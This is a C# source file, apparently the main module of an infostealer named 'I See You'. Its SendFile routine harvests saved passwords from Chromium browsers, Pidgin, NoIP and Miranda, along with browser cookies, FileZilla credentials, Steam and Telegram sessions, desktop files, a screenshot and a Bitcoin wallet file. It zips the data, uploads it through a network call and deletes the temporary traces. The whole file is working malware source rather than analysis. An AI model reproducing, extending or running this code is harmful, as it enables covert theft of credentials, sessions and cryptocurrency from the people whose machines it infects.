using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Windows.Forms;
using ISeeYou;

namespace I_See_you
{
    class Passwords
    {
        public static void SendFile()
        {
            string randomString = Helper.GetRandomString();
            string text = Path.GetTempPath() + randomString;
            Directory.CreateDirectory(text);
            using (StreamWriter streamWriter = new StreamWriter(text + "\\log.txt"))
            {
                streamWriter.WriteLine(string.Concat(new string[]
				{
					"[————————————————————————————————————————————————————————]\r\n[======================= Password =======================]\r\n[========================================================]\r\n\r\n\r\n",
                    "[==================== System Info =======================]\r\n\r\n",
					string.Format("Date: {0}\r\n", DateTime.Now),
					string.Format("Windows Username: {0}\r\n", SystemInformation.UserName),
                    string.Format("Windows MachineName: {0}\r\n", RawSettings.Owner),
					string.Format("HWID: {0}\r\n", RawSettings.HWID),
					string.Format("System: {0}\r\n", GetWindowsVersion()),
                    string.Format("Location: {0}\r\n",RawSettings.Location),
                    string.Format("RAM: {0}\r\n", RawSettings.RAM),
                    "\r\n\r\n[======================= Password =======================]\r\n"
				}));
                try
                {
                    foreach (PassData current in Chromium.Initialise())
                    {
                        streamWriter.WriteLine(current);
                    }
                }
                catch
                {
                }
//******************************Pidgin*********************************************//
                try
                {
                    foreach (PassDataPidgin current2 in Pidgin.Initialise())
                    {
                        streamWriter.WriteLine(current2);
                    }
                }
                catch
                {
                }
//******************************NoIp*********************************************//
                try
                {
                    foreach (PassDataNoIp current3 in NoIP.Initialise())
                    {
                        streamWriter.WriteLine(current3);
                    }
                }
                catch
                {
                }
//******************************Miranda*********************************************//
                try
                {
                    foreach (PassDataMiranda current4 in Miranda.Initialise())
                    {
                        streamWriter.WriteLine(current4);
                    }
                }
                catch
                {
                }
            }
            try
            {
                if (RawSettings.FileGrab)
                {
                    List<string> list = new List<string>(SearchFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)));
                    Directory.CreateDirectory(text + "\\Files\\");
                    for (int i = 0; i < list.Count; i++)
                    {
                        if (new FileInfo(list[i]).Length / 1024 < Int64.Parse("[maxSizeFile]"))
                        {
                            File.Copy(list[i], text + "\\Files\\" + Path.GetFileName(list[i]), true);
                        }
                        else
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
//******************************Steam*********************************************//
            try
            {
                Steam.StealSteam(text);
            }
            catch
            {
            }
            try
            {
                Telegram.StealIt(text);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                GetJpegScreen(text + "\\" + DateTime.Now.ToShortDateString() + "_Screen_desktop.jpg");
            }
            catch (Exception ex2)
            {
                Console.WriteLine(ex2.ToString());
            }
            try
            {
                ChromiumCookie.ChromiumInitialise(text + "\\");
            }
            catch (Exception ex3)
            {
                Console.WriteLine(ex3.ToString());
            }
            try
            {
                FilezillaFTP.FileZilla.Initialise(text + "\\");
            }
            catch (Exception ex4)
            {
                Console.WriteLine(ex4.ToString());
            }
            try
            {
                string text2 = Wallet.BitcoinStealer();
                if (text2 != "" && File.Exists(text2))
                {
                    File.Copy(text2, text + "\\wallet.dat");
                }
            }
            catch (Exception ex5)
            {
                Console.WriteLine(ex5.ToString());
            }
            try
            {
                ZipStore.PackedZip(text, randomString + ".zip");
            }
            catch (Exception ex6)
            {
                Console.WriteLine(ex6.ToString());
            }
            try
            {
                RemoveTempFiles(text);
            }
            catch (Exception ex7)
            {
                Console.WriteLine(ex7.ToString());
            }
            try
            {
                Network.UploadFile(Path.GetTempPath() + "\\" + randomString + ".zip");
                File.Delete(Path.GetTempPath() + "\\" + randomString + ".zip");
                Directory.Delete(Path.GetTempPath() + "\\" + randomString, true);
            }
            catch (Exception ex8)
            {
                Console.WriteLine(ex8.ToString());
            }
        }
        //private static void Zip(string path, string s)
        //{
        //    ZipFile.CreateFromDirectory(path, s, CompressionLevel.Optimal, false, Encoding.UTF8);
        //}
        public static string GetWindowsVersion()
        {
            string result;
            try
            {
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
                string text = string.Empty;
                foreach (ManagementBaseObject current in managementObjectSearcher.Get())
                {
                    ManagementObject managementObject = (ManagementObject)current;
                    text = managementObject["Caption"].ToString();
                }
                if (text.Contains("8"))
                {
                    result = "Windows 8";
                }
                else if (text.Contains("8.1"))
                {
                    result = "Windows 8.1";
                }
                else if (text.Contains("10"))
                {
                    result = "Windows 10";
                }
                else if (text.Contains("XP"))
                {
                    result = "Windows XP";
                }
                else if (text.Contains("7"))
                {
                    result = "Windows 7";
                }
                else if (text.Contains("Server"))
                {
                    result = "Windows Server";
                }
                else
                {
                    result = "Unknown";
                }
            }
            catch
            {
                result = "Unknown";
            }
            return result;
        }

        static List<string> SearchFiles(string patch)
        {
            List<string> list = new List<string>();
            string[] extension = { "[expansion]" }; //"*.txt", "*.doc", "*.docx", "*.png", "*.xls", "*.cs", "*.rar"
            for (int j = 0; j < extension.Length; j++)
            {
                string[] ReultSearch = Directory.GetFiles(patch, extension[j], SearchOption.AllDirectories);
                for (int i = 0; i < ReultSearch.Length; i++)
                {
                    list.Add(ReultSearch[i]);
                }
            }
            return list;
        }
       
        private static void RemoveTempFiles(string directorypath)
        {
            try
            {
                DirectoryInfo[] directories = new DirectoryInfo(directorypath).GetDirectories();
                for (int i = 0; i < directories.Length; i++)
                {
                    DirectoryInfo directoryInfo = directories[i];
                    FileInfo[] files = directoryInfo.GetFiles();
                    for (int j = 0; j < files.Length; j++)
                    {
                        FileInfo fileInfo = files[j];
                        fileInfo.Delete();
                    }
                    directoryInfo.Delete();
                }
                FileInfo[] files2 = new DirectoryInfo(directorypath).GetFiles();
                for (int k = 0; k < files2.Length; k++)
                {
                    FileInfo fileInfo2 = files2[k];
                    fileInfo2.Delete();
                }
                Directory.Delete(directorypath);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        private static void GetJpegScreen(string filepath)
        {
            try
            {
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(bitmap);
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(filepath, ImageFormat.Jpeg);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}
